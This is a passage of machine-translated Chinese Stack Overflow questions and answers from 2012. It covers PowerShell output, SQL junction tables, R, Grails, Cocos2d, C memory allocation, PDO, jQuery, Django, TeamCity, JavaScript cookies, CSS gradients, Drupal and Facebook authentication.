后者的预期结果是这样的：

```
Some information to display on-screen

Name    Value
----    -----
a       b
c       d 
```

最终：

```
return $true #  If what I'm doing worked; otherwise, $false 
```

如果我调用如上所示的函数，我会看到通过`Write-Host`屏幕显示的文本，以及哈希表内容的两列显示 -**以及**文本`True`或`False`屏幕，具体取决于函数返回的内容。

如果我这样称呼它：

```
$myResult = MyFunction $MyHashTable 
```

...我捕获了函数的返回值`$myResult`——但是哈希表内容的显示被*抑制*了。如果我这样做，它也会被抑制：

```
if ( (MyFunction $MyHashTable) -eq $true ) {
    #   do something
} else {
    #   do something different
} 
```

有没有办法

1.  确保哈希表内容的显示，无论函数如何调用；
2.  在任何情况下，*抑制*屏幕显示`True`和`False`执行`Return`语句的时间？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-12T23:54:39.197

您的函数生成的任何输出都将沿管道发送。这正是您编写时发生的情况：

```
$TheHashTable 
```

如果您想将此值写入屏幕而不是管道，您也应该`Write-Host`像前面示例中那样使用，如下所示：

```
Write-Host $TheHastTable 
```

但是，使用上面的代码，您可能会得到如下输出：

```
PS>$table = @{ "test"="fred";"barney"="wilma"}
PS> write-host $table
System.Collections.DictionaryEntry System.Collections.DictionaryEntry 
```

显然`Write-Host`不应用您期望的格式，这可以通过使用来修复`Out-String`：

```
PS> $table | Out-String | Write-Host 
```

导致：

```
Name                           Value
----                           -----
barney                         wilma
test                           fred 
```

# sql - 设计模式——数据库多对多

> ID：13353301
> 
> 赞同：0
> 
> 时间：2012-11-12T23:24:58.543
> 
> 标签：sql, database, many-to-many, junction-table

我有一个关于多对多关系的问题。我知道我们必须创建一个联结表。但是假设我们有这种情况：

一张客户表 一张订单表 一张产品表

一个订单可以有很多产品，而一个产品可能有很多订单。因此，我们创建了一个联结表。我可以在客户和产品之间创建一个连接表，这个连接将是一个存储订单的订单表吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:27:17.710

如果这样做，您如何知道客户在特定订单中包含哪些产品？而且，您将如何处理在多个订单中订购相同产品的客户？

所以，不，您不能只创建一个客户到产品的联结表，因为这不会为您提供最终需要的信息。

# r - 如何在R中的列表元素上应用平均函数

> ID：13353315
> 
> 赞同：15
> 
> 时间：2012-11-12T23:27:08.040
> 
> 标签：r, list, lapply

我有一个列表，我想用它`lapply()`来计算其元素的平均值。例如，对于列表的第七项，我有：

```
>list[[7]]
 [1] 1 1 1 1 1 1 1 1 1 1 
```

我的输出应该是：

```
> mean(temp[[7]][1:10])
[1] 1 
```

但是当我`lapply()`像下面这样使用时，结果会是另外一回事。我应该怎么办？

```
> lapply(list[[7]][1:10],mean)
[[1]]
[1] 1

[[2]]
[1] 1
.
.
.
[[10]]
[1] 1 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-12T23:32:46.923

要获得列表中第 7 个元素的平均值，只需使用`mean(list[[7]])`. 要获得列表中每个元素的平均值，请使用`lapply(list,mean)`. 打电话给你的名单是一个非常糟糕的主意`list`。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-13T00:13:04.070

consider using `sapply` instead of `lapply`.

```
# sample data
a<- 1:3
dat <- list(a, a*2, a*3)

# sapply gives a tidier output
> sapply(dat, mean)
[1] 2 4 6

> lapply(dat, mean)
[[1]]
[1] 2

[[2]]
[1] 4

[[3]]
[1] 6 
```

* * *

Also, you might want to take a look at the `plyr` package. [This question](https://stackoverflow.com/questions/3505701/r-grouping-functions-sapply-vs-lapply-vs-apply-vs-tapply-vs-by-vs-aggrega) also does a good job of explaining the different *apply functions

# unit-testing - Grails控制器测试-无法识别成员变量

> ID：13353320
> 
> 赞同：0
> 
> 时间：2012-11-12T23:27:27.600
> 
> 标签：unit-testing, grails, junit, intellij-idea

Grails (2.1.1., JUnit 4.1, IntelliJ) 控制器测试。为什么顶部代码段中 testHandleLogin 的 uc 不可见？

这个在 testHandleLogin 中的断言失败，因为 uc 是 null

```
@TestFor(UserController)
class UserControllerTests {

    UserController uc
    //def UserController uc > same result, fails 

    void setUp() {

        uc = new UserController()
    }

    void testHandleLogin() {

        assert uc
    } 
```

这行得通，即断言成功

```
@TestFor(UserController)
class UserControllerTests {

    void setUp() {}

    void testHandleLogin() {

        def uc = new UserController()
        assert uc
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T23:38:53.510

当然，在提出问题五分钟后，我找到了解决方案：

将“@Before”添加到 setUp() 方法就可以了。

# cocos2d-iphone - 当我的 Cocos2d 游戏从后台恢复时，动画动作卡顿

> ID：13353321
> 
> 赞同：1
> 
> 时间：2012-11-12T23:27:43.263
> 
> 标签：cocos2d-iphone, ccaction

我有一个精灵，我在 Cocos2d 游戏的菜单屏幕上旋转，如下所示：

```
CCAction* action = [CCRepeatForever actionWithAction:
                         [CCRotateBy actionWithDuration:1.0 angle:90.0f]];
[sprite runAction:action]; 
```

当我将游戏发送到后台，然后恢复游戏时出现问题。如果发送到后台/恢复操作很快，则会出现轻微故障。游戏在后台停留的时间越长，当游戏恢复时，精灵“抽搐”的时间就越长，然后它就会再次开始正常旋转。我在 Cocos2d 2.0，Xcode 4.5，在 iOS 6 上运行。

编辑：好点Gangcil！这是我所拥有的（我相信它来自 Cocos2d 样板：

```
// getting a call, pause the game
-(void) applicationWillResignActive:(UIApplication *)application
{
    if( [_navController visibleViewController] == _director )
        [_director pause];
}

// call got rejected
-(void) applicationDidBecomeActive:(UIApplication *)application
{
    if( [_navController visibleViewController] == _director )
        [_director resume];
} 
```

通过将这些功能更改为：

```
// getting a call, pause the game
-(void) applicationWillResignActive:(UIApplication *)application
{
    if( [_navController visibleViewController] == _director )
    {
        [_director stopAnimation];
        [_director pause];
    }
}

// call got rejected
-(void) applicationDidBecomeActive:(UIApplication *)application
{
    if( [_navController visibleViewController] == _director )
    {
        [_director stopAnimation];
        [_director resume];
        [_director startAnimation];
    }
} 
```

我不确定这是否是正确的方法 - 一开始有一点犹豫（可以理解），但随后动画顺利开始。轻微的犹豫比我之前看到的狂野抖动要好 - 但我不知道这个解决方案是否可以改进。

# windows-8 - 如果在 CPU 和网络限制内，WinRT 后台任务可以长期存在吗？

> ID：13353327
> 
> 赞同：3
> 
> 时间：2012-11-12T23:28:16.630
> 
> 标签：windows-8, windows-runtime, background-process

[微软的文档](http://www.microsoft.com/en-us/download/details.aspx?id=27411)指出：

> 后台任务是指不消耗大量资源的短期任务。

它还说：

> 锁屏上的每个应用每 15 分钟获得 2 秒的 CPU 时间，可供应用的所有后台任务使用。在 15 分钟结束时，锁定屏幕上的每个应用程序都会获得另外 2 秒的 CPU 时间供其后台任务使用。

*   我需要每两分钟运行一次后台任务来更新我的动态磁贴。
*   我的应用是锁屏应用。
*   计算在 CPU 和网络使用限制范围内

我可以创建一个永久的后台任务（例如，轮询 Web 服务并提取信息、等待和循环的任务）以每两分钟创建一个，还是有更好的方法来做到这一点？[`OneShot`](http://msdn.microsoft.com/en-us/library/windows/apps/windows.applicationmodel.background.timetrigger.oneshot.aspx) `TimeTrigger`

我对后台任务选项的担忧是运行时是否会认为任务在睡眠时处于非活动状态并关闭它，或者像在 15 分钟内可以更新动态磁贴的次数有限制......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-06-04T15:07:17.387

是的，如果长寿是指不到 25 分钟。

时间触发器的执行频率不能超过 15 分钟。创建一个在 2 分钟内执行的 OneShot 触发器是一个有趣的想法，应该可以工作。是的，后台任务可以注册其他后台任务来保持这个链条的运行。如果用户的机器在执行时关闭，它将稍后排队。

Having said that, updating your tile that frequently & using a background task is not a wise solution. Because, it is unreliable. Background tasks can be disabled, for one. But every 15 minutes, you are going to exceed your quota. Try using a Scheduled tile instead.

# c - 动态内存分配的二进制加法

> ID：13353329
> 
> 赞同：-3
> 
> 时间：2012-11-12T23:28:21.050
> 
> 标签：c, string, binary, malloc, realloc

*很长一段时间后，我在 C 中使用动态内存分配，但遇到了一些内存泄漏问题……我只是看不出问题出在哪里。有人可以帮忙吗？*

**EDIT2：即使数字非常大，该程序现在也可以正常工作并且非常快:) 我决定更改程序结构并使用 struct 而不是 char 字符串。不应该有任何内存泄漏（用 valgrind 测试）。**

当前代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct binary{
    char * number;
    size_t length;
}Tbinary;

//exterminate leading zeros
size_t exterminate(char * bin, size_t length){
char * pch = NULL;
long position = 0;

pch = strchr(bin, '1');
if(pch==NULL){
    bin[1] = '\0';
    length = 2;
}
else{
    position = pch-bin;
    strcpy(bin, pch);
}

return (length-position);
}

int binaryAdd(Tbinary first, Tbinary second){
int a=0, b=0, sum=0, carry=0;
size_t index = first.length;
first.number[first.length] = '\0';

while((first.length != 0) || (carry != 0)){
    if(first.length>1) a= first.number[first.length-2]-'0';
    else a = 0;
    if(second.length>1) b= second.number[second.length-2]-'0';
    else b = 0;
    sum = (a+b+carry)%2;
    first.number[first.length-1] = (sum)+'0';
    carry = (a+b+carry)/2;
    if(first.length >0)first.length--;
    if(second.length >0)second.length--;
}

exterminate(first.number,index);

printf("Sum: %s\n", first.number);
return EXIT_SUCCESS;
}

int get_number(Tbinary *bin_addr){
char * tmp, * bin;
char ch=1;
int size = 1, index = 0;
bin = bin_addr->number;

while(ch){
    ch = getc(stdin);

    if((ch == '\n') || (ch == ' ')) ch = '\0';

    if((ch-'0' != 0) && (ch-'0' != 1) && (ch != '\0')) return EXIT_FAILURE;

    if (size-1 <=index){
        size += 5;
        tmp = (char *)realloc(bin, size*sizeof(char));
        if(tmp == NULL){
            return EXIT_FAILURE;
        }
        bin = tmp;
        bin_addr->number = bin;
    }
    bin[index++] = ch;
}

bin_addr->length = index;
bin_addr->length = exterminate(bin_addr->number, bin_addr->length);

return EXIT_SUCCESS;
} 

int main (void)
{
Tbinary bin1 = {bin1.number = NULL, bin1.length = 0};
Tbinary bin2 = {bin2.number = NULL, bin2.length = 0};

//allocate space for first number
bin1.number = (char *)malloc(sizeof(char));
if(bin1.number == NULL)
    return EXIT_FAILURE;

//allocate space for second number
bin2.number = (char *)malloc(sizeof(char));
if(bin2.number == NULL){
    free(bin1.number);
    return EXIT_FAILURE;
}

printf("Enter two binary numbers:\n");

//number1 load
if(get_number(&bin1) != EXIT_SUCCESS){
    free(bin1.number);
    free(bin2.number);
    printf("Invalid input.\n");
    return EXIT_FAILURE;
}

//number2 load
if(get_number(&bin2) != EXIT_SUCCESS){
    free(bin1.number);
    free(bin2.number);
    printf("Invalid input.\n");
    return EXIT_FAILURE;
}

//add the two numbers
if(bin1.length >= bin2.length){
    if(binaryAdd(bin1, bin2) != EXIT_SUCCESS){
        free(bin1.number);
        free(bin2.number);
        printf("Invalid input.\n");
        return EXIT_FAILURE;
    }
}
else{
    if(binaryAdd(bin2, bin1) != EXIT_SUCCESS){
        free(bin1.number);
        free(bin2.number);
        printf("Invalid input.\n");
        return EXIT_FAILURE;
    }
}

free(bin1.number);
free(bin2.number);
return EXIT_SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:40:08.317

在 binaryAdd() 中，在所有情况下，您都应该在 realloc() 之后释放 sum，而不仅仅是在 realloc() 返回 null 时。在 get_number() 中也是一样的。关于`a = (int)strlen(first);`为什么将 strlen() 的返回值转换为 int？另外，不要强制返回分配函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T00:41:52.707

您的`size`和`index`关系中有一个错误：

```
 if (size <=index){
        size += 5;
        tmp = (char *)realloc(sum, size*sizeof(char));
        if(tmp == NULL){
            free(sum);  // free memory to avoid leak
            return EXIT_FAILURE;
        }
        sum = tmp;
    }
    for(int i=index; i>0; i--){
        sum[i] = sum[i-1];
    }
    sum[0] = num%2+'0';
    carry = num/2;
    index++;
}
sum[index] = '\0'; 
```

如果在进入最后一次迭代时`index == size-1`，您正在分配的内存之外进行写入。有时这可能是无害的，对于其他人来说，您可能会覆盖一些重要数据而不会导致立即崩溃，有时它可能会导致立即崩溃（通常当越界访问跨越页面边界时）。将测试更改为`size - 1 <= index`.

在`get_number`中，如果需要`realloc`，只需将 的本地副本更改为`char*`输入缓冲区，因此如果位置更改，则 in 指针`main`指向无效内存。它应该是

```
int get_number(char **bin_addr){
    char * tmp, bin = *bin_addr;
    char ch=1;
    size_t size = 1, index = 0;

    while(ch){
        ch = getc(stdin);

        if((ch == '\n') || (ch == ' ')){
            ch = '\0';
        }

        if((ch-'0' != 0) && (ch-'0' != 1) && (ch != '\0')){
            return EXIT_FAILURE;
        }

        if (size-1 <=index){
            size += 5;
            tmp = (char *)realloc(bin, size*sizeof(char));
            if(tmp == NULL){
                return EXIT_FAILURE;
            }
            bin = tmp;
            *bin_addr = bin;  // let the pointer always point to the real block
        }
        bin[index++] = ch;
    }
    return EXIT_SUCCESS;
} 
```

并被召入`get_number(&bin1);`。`main`

# php - PDO 安全问题

> ID：13353331
> 
> 赞同：1
> 
> 时间：2012-11-12T23:28:21.987
> 
> 标签：php, pdo, sql-injection

> **可能的重复：**
> [PDO 准备好的语句有多安全](https://stackoverflow.com/questions/1314521/how-safe-are-pdo-prepared-statements)

所以我正在研究 PDO 来替换我的 php.ini 中的所有 mysql 查询。我这样做的主要原因是为了安全和易于编码。不过，我只是想知道，就安全性而言。一旦我完成替换任何 mysql 查询调用以及我使用 PDO 从用户那里捕获的任何数据，我应该考虑在查询的准备和执行之间放置什么？或者那会照顾安全。我想我只是不明白 PDO 的安全性在哪里。这是我的一些代码示例，用于获取用户输入然后将其放入数据库中。这有什么问题吗？或者我可以做的改进？

```
<?php
session_start();
include("dbgear.php");

$var1 = $_POST['stuff1'];
$var2 = $_POST['stuff2'];
$var3 = $_POST['stuff3'];
$var4 = $_POST['stuff4'];
$var5 = $_SESSION['stuff5'];
$vardate = date("M d, Y h:i A");

$info = "INSERT INTO comments SET     name=:user,class=:class,comment=:commentarea,date=:date,detector=:detector";

$send = $connect->prepare($info);
$send->execute(array(':user'=>$var1,':class'=>$var2,':commentarea'=>$var3,':date'=>$var4,':detector'=>$var5));

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:32:36.330

您不必担心放入数据库中的内容。一切（安全方面）都由 PDO 处理。

但请记住，如果您稍后在您的网站上使用这些数据，它可能包含 javascript（XSS 注入）。因此，在您将用户数据输入数据库之前，请始终过滤您的用户数据、将整数转换为 int、过滤用户上传的 html 等，以获得最安全的方法。

# cocos2d-iphone - 使用 levelhelper 在 cocos2d 中滚动边界

> ID：13353335
> 
> 赞同：1
> 
> 时间：2012-11-12T23:28:35.143
> 
> 标签：cocos2d-iphone, move, layer, parallax, levelhelper

我正在使用 levelhelper 和偷偷摸摸的输入制作一个横向滚动游戏。我有几个问题。我在不同的图层上有偷偷摸摸的输入，我在使用 levelhelper 的视差滚动时遇到了问题。

我无法设法应用边界并正确移动图层。我将如何修复滚动？要在边界内并以角色为中心？

我在更新方法中有这两种方法

```
 -(void) update:(ccTime)deltaTime{
[self applyJoystick:_leftJoystick forTimeDelta:deltaTime];
[self setViewpointCenter:hero.position];}

-(void)applyJoystick:(SneakyJoystick *)aJoystick forTimeDelta:(float)delta{
CGRect worldRect = [loader gameWorldSize];
CGPoint scaledVelocity=ccpMult(aJoystick.velocity, 90.0f);
CGPoint newPosition =ccp(hero.position.x+scaledVelocity.x*delta, hero.position.y +scaledVelocity.y *delta);

float posX = MIN(worldRect.origin.x + worldRect.size.width - hero.centerToSides, MAX(hero.centerToSides, newPosition.x));
float posY = MIN(worldRect.origin.y + worldRect.size.height - hero.centerToBottom, MAX(hero.centerToBottom, newPosition.y));

[hero setPosition:cpp(posX,posY)];}

-(void)setViewpointCenter:(CGPoint) position {

CGSize winSize = [[CCDirector sharedDirector] winSize];
CGRect worldRect = [loader gameWorldSize];
CGPoint centerOfView = ccp(winSize.width/2, winSize.height/2);

int x = MAX(position.x, worldRect.origin.x + winSize.width / 2);
int y = MAX(position.y, worldRect.origin.y + winSize.height / 2);
x = MIN(x, (worldRect.origin.x + worldRect.size.width) - winSize.width / 2);
y = MIN(y, (worldRect.origin.y + worldRect.size.height) - winSize.height/2);

CGPoint actualPosition = ccp(x, y);

CGPoint viewPoint = ccpSub(centerOfView, actualPosition);
self.position = viewPoint;} 
```

我也尝试翻转我使用的角色（LHSprite）

```
 if (newPosition.x< hero.position.x)
    hero.flipX=YES;
else
    hero.flipX = YES; 
```

但不工作，但我也尝试使用

```
 hero.scaleX=-1 
```

翻转它而不是flipX，翻转但转到屏幕的另一侧翻转。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T10:28:12.817

部分解决。

似乎

```
myParallax = [loader parallaxNodeWithUniqueName:@"Parallax_1"]; 
```

搞砸了，所以我禁用它，

我将第一种方法更改为

```
-(void)applyJoystick:(SneakyJoystick *)aJoystick forTimeDelta:(float)delta{
CGRect worldRect = [loader gameWorldSize];
CGSize winSize = [[CCDirector sharedDirector] winSize];
CGPoint scaledVelocity=ccpMult(aJoystick.velocity, 200.0f);
CGPoint newPosition =ccp(hero.position.x+scaledVelocity.x*delta, hero.position.y +scaledVelocity.y *delta);

float posX = MIN(worldRect.size.width - hero.centerToSides, MAX(hero.centerToSides, newPosition.x));
float posY = MIN(winSize.height -winSize.height/2+ hero.centerToBottom, MAX(hero.centerToBottom, newPosition.y));

if (scaledVelocity.x >= 0)
    hero.scaleX = 1.0;
else
    hero.scaleX = -1.0;

[hero setPosition:ccp(posX, posY)];
} 
```

似乎当滚动不正确并进入世界之外的白色区域并且一切都正确时，您需要找到一个关于视差比、水平大小和速度的方程。

# jquery - JQuery nth Child divs 子项

> ID：13353342
> 
> 赞同：3
> 
> 时间：2012-11-12T23:29:11.440
> 
> 标签：jquery, jquery-selectors, css-selectors

我为每个调用的产品列表使用一个 div，`result-products`其中包含标题、图像、描述和信息的 div。`result-products`将为 中的每个条目调用`database`。我想让每三分之一更改为`result-products-third`. 为此，我使用 jquery 代码：

```
$("#products-results :nth-child(3n)").removeClass("result-products");
$("#products-results :nth-child(3n)").addClass("result-products-third"); 
```

`"#products-results"`是使用的包含 div。

问题是当第 n 个孩子每 3 个得到一个时，`"result-produts"`但它也得到了第 3 个 div `"result-products-des"`。我怎样才能阻止它进入下一个孩子

```
<div class="result-products">
  <div class="result-products-title">
    content
  </div>
  <div class="result-products-img">
    image
  </div>  
  <div class="result-products-des">
    description
  </div>
  <div class="result-products-info">
    info
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T23:32:39.123

您可以使用子选择器：

```
$("#products-results > :nth-child(3n)").removeClass("result-products"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-02-01T10:51:31.417

```
 $(function(){
            $(document).find('div').siblings().each(function(){
                var obj = $(this);
                obj.find('div').each(function(){
                    var obj1 = $(this);
                    if(!obj1.children().length > 0){
                        alert(obj1.html());
                    }
                });

            });
        });

<div id="2">
    <div>
        <div>
            <div>XYZ Pvt. Ltd.</div>
        </div>
    </div>
</div>
<div id="3">
    <div>
        <div>
            <div>ABC Pvt Ltd.</div>
        </div>
    </div>
</div> 
```

# django - django - 为添加的每个 ManyToMany 字段添加一个计数器

> ID：13353344
> 
> 赞同：0
> 
> 时间：2012-11-12T23:29:41.417
> 
> 标签：django, django-models, django-admin, many-to-many, relationship

我有这些模型：

```
#model.py

class Subject(models.Model):
    name = models.CharField("Name",max_length=50, blank=True)
    ...
    ...

class Activity(models.Model):
    label = models.CharField("Act. name",max_length=150)
    price = models.DecimalField("price", max_digits=10, decimal_places=2,default=0)
    count = models.IntegerField("Count", default=0)

    def __unicode__(self):
        return u"%s" % (self.label)
    class Meta:
        verbose_name_plural = "Activities"

class Invoice(models.Model):
    subject = models.ForeignKey(Subject)
    date = models.DateField(default=date.today())
    activities = models.ManyToManyField(Activity)
    ....
    .... 
```

在管理员上创建新的发票实例时，我可以选择多对多字段“活动”，但我希望有一个额外的计数器（例如 IntegerField）作为发票字段来计算和保存每个活动的数量添加到我的 Invoice 实例中。这可能吗？

谢谢，

卢克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:34:55.587

您可以在模型上有一个字段并覆盖保存方法

```
class Invoice(models.Model):
    subject = models.ForeignKey(Subject)
    date = models.DateField(default=date.today())
    activities = models.ManyToManyField(Activity)
    activity_count = models.PositiveIntegerField(default=0)
    def save(self):
       self.activity_count = self.activities.count()
       super(Invoice, self).save() 
```

# teamcity - 我应该如何将 NuGet 工件移动到新的 TeamCity 服务器？

> ID：13353351
> 
> 赞同：4
> 
> 时间：2012-11-12T23:30:04.317
> 
> 标签：teamcity, nuget

我们一直使用 TeamCity 作为 NuGet 服务器并取得了巨大成功。上周我将 TeamCity 迁移到了一台新的服务器机器上。数据库保留在外部服务器上的位置。我将 artifacts 文件夹复制到了新服务器，我可以看到它们都列在项目配置页面上。但是，旧包未显示在 NuGet 包源中。我还需要做什么才能让新的 TeamCity 服务器在提要中列出那些旧包？

依赖于这些包的旧版本的其他项目目前已损坏，因为无法找到它们。

这些 NuGet 包的新版本显示在提要中，但我还需要所有旧版本。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-17T15:31:15.120

谢谢黛米。你让我走上了为我解决这个问题的正确道路。

使这里的答案更加完整和正式：

覆盖以下文件：provider-nuget.data provider-nuget.index

在 \system\caches\buildsMetadata 中，来自旧构建服务器的相同文件对我有用（在创建新构建之前 - 不确定你是否能够在事后完成合并）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T22:54:26.050

我现在不记得我究竟做了什么来解决这个问题，但它与运行 TeamCity 的服务器上此文件夹中的文件有关：C:\ProgramData\JetBrains\TeamCity\system\caches\buildsMetadata

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-20T07:20:58.750

您是否也从旧版本中移动了旧工件？

# javascript - 使用此 JavaScript 将 cookie 加载到变量中

> ID：13353352
> 
> 赞同：3
> 
> 时间：2012-11-12T23:30:15.807
> 
> 标签：javascript, jquery, regex, cookies

我正在从这个线程工作：

[在 JavaScript 中按名称读取 cookie 的最短函数是什么？](https://stackoverflow.com/questions/5639346/shortest-function-for-reading-a-cookie-in-javascript)

这表明可以使用以下代码在 JavaScript 中读取 cookie：

```
function read_cookie(key)
{
    var result;
    return (result = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (result[1]) : null;
} 
```

我有一个名为“country”的cookie，它的值是两个字母，例如“AZ”。我想知道如何读取 cookie 的值并将其放入一个名为 cookie_country 的变量中。这个正则表达式比我高一点，我不知道从哪里开始。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T23:34:25.593

这个...

```
var cookie_country = read_cookie('country'); 
```

...对于这种情况应该足够了。) 这个函数的要点（和其他许多函数一样）是它为您提供了一个工具，用于`document.cookie`通过某个字符串键（`'country'`在您的情况下）从字符串中提取值：您不需要知道该工具的工作原理，除非它休息。)

...但无论如何，也许知道这一点也会很有趣。)`document.cookie`实际上是一个字符串，其中包含以分号分隔的 cookie 列表（其键和值）。这里有更多[关于它](https://developer.mozilla.org/en-US/docs/DOM/document.cookie)的信息（MDN）。

正则表达式基本上在行的开头或结尾处捕获与给定字符串匹配的字符串部分`;`，然后继续直到再次出现另一个分号的字符串结尾。

例如，如果`key`参数等于`country`，则正则表达式将如下所示：

```
/(?:^|; )country=([^;]*)/ 
```

...它将捕获与字符串关联的存储*值。*`document.cookie``country`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:45:20.507

我想你必须逐行阅读 cookie。

```
var rows = document.cookie.split(;);
for (i=0;i<rows.length;i++)
{
    var firstrow = rows[i].substr(0,rows[i].indexOf("="));
} 
```

创建时，您可以将变量放在标识符之间，例如 AZ 正则表达式应如下所示：'##[AZ]{2}##'

当然，我可能完全错了:)

希望这可以帮助。

# css - 在边框上使用渐变

> ID：13353354
> 
> 赞同：0
> 
> 时间：2012-11-12T23:30:21.617
> 
> 标签：css, border

我有一个边框，我想在其中成为顶部的渐变，以在边框上创建灯光效果。但是它不起作用，我认为我的边框代码错误，或者我缺少需要定义的属性。

这是CSS：

```
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
-o-box-sizing: border-box;
box-sizing: border-box;
padding: 25px;
background:#f2f2f2;
border: 5px solid #b30005;
-webkit-box-shadow: 0 5px 10px rgba(0,0,0,0.4);
-moz-box-shadow: 0 5px 10px rgba(0,0,0,0.4);
-o-box-shadow: 0 5px 10px rgba(0,0,0,0.4);
box-shadow: 0 5px 10px rgba(0,0,0,0.4);
-webkit-border-radius:25px;
-moz-border-radius: 25px;
-o-border-radius: 25px;
border-radius:25px;
/*    border-top:  25px solid #b30005; */

border-top:  25px solid rgb(179,0,5); /* Old browsers */
border-top:  25px solid url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwJSIgc3RvcC1jb2xvcj0iI2IzMDAwNSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgPC9saW5lYXJHcmFkaWVudD4KICA8cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBmaWxsPSJ1cmwoI2dyYWQtdWNnZy1nZW5lcmF0ZWQpIiAvPgo8L3N2Zz4=); /*IE 9 */
border-top:  25px solid -moz-linear-gradient(top, rgba(255,255,255,1) 0%, rgba(179,0,5,1) 10%); /* FF3.6+ */
border-top:  25px solid -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgba(255,255,255,1)), color-stop(10%,rgba(179,0,5,1))); /* Chrome,Safari4+ */
border-top:  25px solid -webkit-linear-gradient(top, rgba(255,255,255,1) 0%,rgba(179,0,5,1) 10%); /* Chrome10+,Safari5.1+ */
border-top:  25px solid: -o-linear-gradient(top, rgba(255,255,255,1) 0%,rgba(179,0,5,1) 10%); /* Opera 11.10+ */
border-top:  25px solid: -ms-linear-gradient(top, rgba(255,255,255,1) 0%,rgba(179,0,5,1) 10%); /* IE10+ */
border-top:  25px solid linear-gradient(to bottom, rgba(255,255,255,1) 0%,rgba(179,0,5,1) 10%); /* W3C */
z-index:3; 
```

这是我创建的[小提琴。](http://jsfiddle.net/Lynda333/jK2kF/1/)

如何仅为跨浏览器工作的顶部边框创建渐变？（注：我只担心 IE 9+ 我会为 IE8 及以下使用纯色。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:18:09.943

[这是通过CSS-Tricks](http://css-tricks.com/examples/GradientBorder/)使用的几个解决方案。

看来您可以`border-image`用来设置线性渐变。例如，对于从下到上的边框：

```
.bottom-to-top {
  border-width:3px;
  -webkit-border-image: 
    -webkit-gradient(linear, 0 100%, 0 0, from(black), to(rgba(0, 0, 0, 0))) 1 100%;
  -webkit-border-image: 
    -webkit-linear-gradient(bottom, black, rgba(0, 0, 0, 0)) 1 100%;
  -o-border-image:
    -o-linear-gradient(bottom, black, rgba(0, 0, 0, 0)) 1 100%;
  -moz-border-image:
    -moz-linear-gradient(bottom, black, rgba(0, 0, 0, 0)) 1 100%;    
} 
```

# drupal - 按角色阻止可见性

> ID：13353356
> 
> 赞同：0
> 
> 时间：2012-11-12T23:30:27.260
> 
> 标签：drupal, drupal-7

我正在使用带有块可见性规则的 Drupal 7。我只需要我的块来显示用户何时注册该网站（经过身份验证），而不是显示非注册用户（匿名）何时访问该网站。我的块配置中的角色可见性设置正确，但无论角色如何，块仍然显示。

真正奇怪的是，我有一页工作正常，而另外 40 多页则没有。

我已经准备好我应该能够使用 PHP 和类似这样的东西来控制块内容本身的可见性：

```
<?php
global $user;
  if (in_array('Approved Role',$user->roles)) {
return TRUE;
 } else {
return FALSE;
}
?> 
```

但我不确定如何实现它。我打开了 PHP 过滤器，但我在哪里添加我的内容？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:20:03.200

弄清楚了！

```
<?php
global $user;
if ($user->uid){ ?> 
```

html在这里

```
} else {
return FALSE;
}
?> 
```

# facebook - Web API 服务/移动应用程序的 Facebook 身份验证

> ID：13353359
> 
> 赞同：7
> 
> 时间：2012-11-12T23:30:36.303
> 
> 标签：facebook, authentication, asp.net-web-api, facebook-c#-sdk

我有一个 ASP.NET MVC Web Api Web 服务和一些使用它的移动应用程序。

我正在努力为我的应用程序和 Web 服务实施身份提供程序和安全性。我可以使用 Facebook 身份验证来管理我的用户的身份吗？通读 FB 登录文档，我看不出如何......我想象我会让用户通过 FB 登录，通过我选择实施的身份验证流程，然后取回访问令牌。但是下次他们打开我的应用程序时会发生什么？他们如何再次进行身份验证，我在我的数据库中存储什么来唯一标识 Facebook 用户（和我的应用程序的用户）？我需要他们在我的应用程序上下文中的身份，而不仅仅是要知道 Facebook 说他们没问题。

由于这是一个仅提供 JSON（无 UI）的 Web Api，因此我不喜欢使用任何 javascript。但是，您需要在流程中的某个点进行重定向这一事实也让我担心，因为移动应用程序不应该在登录期间重定向。

* * *

## 回答 #1

